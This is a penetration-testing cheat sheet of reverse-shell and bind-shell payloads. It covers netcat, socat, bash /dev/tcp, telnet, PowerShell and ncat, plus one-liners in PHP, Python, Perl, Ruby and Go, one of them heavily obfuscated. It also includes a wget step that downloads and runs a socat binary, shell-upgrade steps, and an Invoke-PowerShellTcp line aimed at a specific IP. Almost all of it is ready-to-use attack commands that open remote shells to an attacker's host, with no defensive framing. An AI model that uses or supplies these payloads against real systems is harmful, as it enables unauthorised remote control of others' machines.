
# Reverse Shells

## Listeners 
```bash
nc -lvnp $source_port
```
```bash
socat file:tty,raw,echo=0 tcp-listen:$source_port
```

## Commands

### Linux
```bash
nc -e /bin/bash $source_ip $source_port
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $source_ip $source_port >/tmp/f
```
```bash
bash -i >& /dev/tcp/$source_ip/$source_port 0>&1
```
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$source_ip:$source_port
```
```bash
wget -q http://$source_ip/lists/static-binaries/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$source_ip:$source_port
```
```bash
rm -f /tmp/p; mknod /tmp/p p && nc $source_ip $source_port 0/tmp/p
```
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet $source_ip $source_port 0/tmp/p
```

### Windows 
```bash
//$source_ip/$smb_share/lists/static-binaries/binaries/windows/x86/ncat.exe $source_ip $source_port  --ssl -e cmd -v 
```
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$source_ip",$source_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### ncat

#### Reverse Shell
Attacker:
```
ncat -lnvp $source_port --allow $target --ssl
```
Victim:
```
ncat -nv $source_ip $source_port -e cmd.exe --ssl
```

#### Bind Shell
Victim:
```
ncat -lnvp $source_port -e cmd.exe --allow $source_ip --ssl
```
Attacker:
```
ncat -nv $target $source_port --ssl
```

## Programming Languages

### Linux
```bash
php -r '$sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$source_ip",$source_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```bash
perl -e 'use Socket;$i="$source_ip";$p=$source_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
```bash
ruby -rsocket -e'f=TCPSocket.open("$source_ip",$source_port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$source_ip","$source_port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$source_ip:$source_port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### Windows
```bash
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$source_ip', $source_port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$source_ip:$source_port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
```bash
ruby -rsocket -e 'c=TCPSocket.new("$source_ip","$source_port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Upgrade Your Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Enter ctl+z in terminal that is running reverse shell"
```bash
echo $TERM
stty -a
stty raw -echo
```
```bash
fg
```
```bash
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```




Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 9999